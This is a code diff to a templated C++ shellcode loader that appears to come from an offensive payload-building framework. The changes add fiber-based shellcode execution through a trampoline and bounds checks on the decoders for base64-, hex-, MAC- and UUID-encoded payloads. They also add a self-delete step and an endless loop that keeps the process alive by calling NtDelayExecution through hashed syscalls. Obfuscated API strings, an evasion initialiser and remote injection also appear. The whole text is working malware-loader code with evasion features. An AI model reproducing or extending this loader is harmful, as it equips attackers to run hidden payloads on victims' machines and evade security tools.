@@ -43,6 +43,18 @@ static const char encoded_payload[] = "{{ENCODED_PAYLOAD}}";
 static const char encoded_payload[] = "{{ENCODED_PAYLOAD}}";
 {{#ENDIF}}
 
+{{#IF EXEC_FIBER}}
+using SwitchToFiber_t = void(WINAPI*)(LPVOID);
+struct FiberCtx { LPVOID mainFiber; LPVOID shellcode; SwitchToFiber_t pSF; };
+static FiberCtx g_fiber_ctx;
+static VOID CALLBACK fiber_trampoline(LPVOID param) {
+    auto* ctx = reinterpret_cast<FiberCtx*>(param);
+    auto sc = reinterpret_cast<void(*)()>(ctx->shellcode);
+    sc();
+    ctx->pSF(ctx->mainFiber);
+}
+{{#ENDIF}}
+
 {{#IF LOCAL_INJECT}}
 static void execute_local() {
 {{#IF ENTROPY_REDUCE}}
@@ -61,21 +73,25 @@ static void execute_local() {
 {{#IF ENCODE_BASE64}}
     uint8_t decode_buf[{{PAYLOAD_SIZE}} + 256];
     encrypted_len = decode_base64(encoded_payload, sizeof(encoded_payload) - 1, decode_buf);
+    if (encrypted_len > {{PAYLOAD_SIZE}}) encrypted_len = {{PAYLOAD_SIZE}};
     encrypted = decode_buf;
 {{#ENDIF}}
 {{#IF ENCODE_HEX}}
     uint8_t decode_buf[{{PAYLOAD_SIZE}} + 256];
     encrypted_len = decode_hex(encoded_payload, sizeof(encoded_payload) - 1, decode_buf);
+    if (encrypted_len > {{PAYLOAD_SIZE}}) encrypted_len = {{PAYLOAD_SIZE}};
     encrypted = decode_buf;
 {{#ENDIF}}
 {{#IF ENCODE_MAC}}
     uint8_t decode_buf[{{PAYLOAD_SIZE}} + 256];
     encrypted_len = decode_mac(encoded_payload, sizeof(encoded_payload) - 1, decode_buf);
+    if (encrypted_len > {{PAYLOAD_SIZE}}) encrypted_len = {{PAYLOAD_SIZE}};
     encrypted = decode_buf;
 {{#ENDIF}}
 {{#IF ENCODE_UUID}}
     uint8_t decode_buf[{{PAYLOAD_SIZE}} + 256];
     encrypted_len = decode_uuid(encoded_payload, sizeof(encoded_payload) - 1, decode_buf);
+    if (encrypted_len > {{PAYLOAD_SIZE}}) encrypted_len = {{PAYLOAD_SIZE}};
     encrypted = decode_buf;
 {{#ENDIF}}
 
@@ -252,10 +268,9 @@ static void execute_local() {
 
 {{#IF EXEC_FIBER}}
     {
-        // CaroKann: fiber-based execution
+        // CaroKann: fiber-based execution with trampoline
         using ConvertThreadToFiber_t = LPVOID(WINAPI*)(LPVOID);
         using CreateFiber_t = LPVOID(WINAPI*)(SIZE_T, LPFIBER_START_ROUTINE, LPVOID);
-        using SwitchToFiber_t = void(WINAPI*)(LPVOID);
         using ConvertFiberToThread_t = BOOL(WINAPI*)();
 
         HMODULE hK32 = GetModuleHandleW(obf_wide(L"kernel32.dll"));
@@ -271,9 +286,15 @@ static void execute_local() {
 
         LPVOID mainFiber = pCTF(NULL);
         if (!mainFiber) return;
-        LPVOID scFiber = pCF(0, reinterpret_cast<LPFIBER_START_ROUTINE>(exec_addr), NULL);
-        if (!scFiber) return;
+
+        g_fiber_ctx.mainFiber = mainFiber;
+        g_fiber_ctx.shellcode = exec_addr;
+        g_fiber_ctx.pSF = pSF;
+
+        LPVOID scFiber = pCF(0, fiber_trampoline, &g_fiber_ctx);
+        if (!scFiber) { if (pCFT) pCFT(); return; }
         pSF(scFiber);
+        // Don't DeleteFiber — shellcode threads may reference fiber stack data
         if (pCFT) pCFT();
     }
 {{#ENDIF}}
@@ -441,12 +462,26 @@ static void run_payload() {
         if (!evasion_init()) return;
         g_initialized = true;
     }
+
 {{#IF LOCAL_INJECT}}
     execute_local();
 {{#ENDIF}}
 {{#IF REMOTE_INJECT}}
     execute_remote();
 {{#ENDIF}}
+
+{{#IF SELF_DELETE}}
+    self_delete();
+{{#ENDIF}}
+
+    // Keep alive for shellcode threads
+    LARGE_INTEGER wait;
+    wait.QuadPart = -10000LL * 60000;
+    auto NtDE = get_syscall_fn<NtDelayExecution_t>(HASH_NtDelayExecution);
+    for (;;) {
+        if (NtDE) NtDE(FALSE, &wait);
+        else Sleep(60000);
+    }
 }
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
@@ -475,6 +510,13 @@ int main() {
     self_delete();
 {{#ENDIF}}
 
-    return 0;
+    // Keep process alive for shellcode that spawns threads (staged payloads)
+    LARGE_INTEGER wait;
+    wait.QuadPart = -10000LL * 60000; // 60 seconds
+    auto NtDE = get_syscall_fn<NtDelayExecution_t>(HASH_NtDelayExecution);
+    for (;;) {
+        if (NtDE) NtDE(FALSE, &wait);
+        else Sleep(60000);
+    }
 }
 {{#ENDIF}}
